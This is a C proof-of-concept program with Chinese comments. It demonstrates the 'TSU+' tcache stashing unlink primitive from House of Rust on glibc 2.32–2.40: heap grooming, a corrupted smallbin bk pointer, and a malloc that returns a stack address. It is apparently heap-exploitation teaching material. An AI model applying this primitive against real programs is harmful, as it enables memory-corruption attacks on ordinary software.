/*
 * House of Rust 使用的 TSU+ 子原语，适用于 glibc 2.32～2.40。
 *
 * 漏洞模型：可以修改已经进入 smallbin 的 chunk->bk。
 * 成功效果：下一次 malloc 返回栈上的 target。
 *
 * 这是 House of Rust 第二阶段里的一个组件，只演示 TSU+ 本身，不包含
 * 原链里用 largebin 写修复 fd 的那部分堆风水。
 */

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    /* target 必须按 0x10 对齐，否则过不了 tcache_get 的地址对齐检查。 */
    __attribute__((aligned(16))) size_t target[4] = {0};
    size_t *chunk[9];
    size_t *result;

    setbuf(stdout, NULL);

    /* 连续申请八个物理大小为 0x110 的 chunk。 */
    for (int i = 0; i < 8; i++)
        chunk[i] = malloc(0x100);

    /* 这个 fence chunk 用来防止 chunk[7] 和后面的 chunk 发生合并。 */
    malloc(0x20);

    /* 再准备一个同尺寸的 chunk。 */
    chunk[8] = malloc(0x100);

    /* 最后这个 fence 用来防止 chunk[8] 和 top chunk 合并。 */
    malloc(0x20);

    /*
     * 前七次 free 刚好填满 0x110 这个 tcache bin。
     * 后两个 chunk 因为 tcache 已经满了，只能进入 unsorted bin。
     */
    for (int i = 0; i < 9; i++)
        free(chunk[i]);

    /* 这次大 request 用不到 0x110 的 chunk，会把 unsorted 里那两个 chunk 分流进 smallbin。 */
    malloc(0x200);

    /* 从 tcache 里取走两个节点，给 smallbin stashing 留出两个空槽位。 */
    malloc(0x100);
    malloc(0x100);

    /*
     * chunk[8][1] 就是这个已释放 chunk 的 bk 字段。
     * 把 bk 改成 target-0x10，这样 target 就会被当成伪造 chunk 的用户区。
     */
    chunk[8][1] = (size_t)target - 0x10;

    /* stashing 过程会执行 bck->fd = bin，所以 fake->bk 必须指向一块可写的地址。 */
    target[1] = (size_t)target;

    /* calloc 会走 smallbin 路径，触发 smallbin 节点向 tcache 搬运的流程。 */
    calloc(1, 0x100);

    /* 此时 tcache 的下一项已经是我们伪造好的 target 了。 */
    result = malloc(0x100);

    assert(result == target);
    printf("[+] TSU+ 返回目标\n");
    return 0;
}
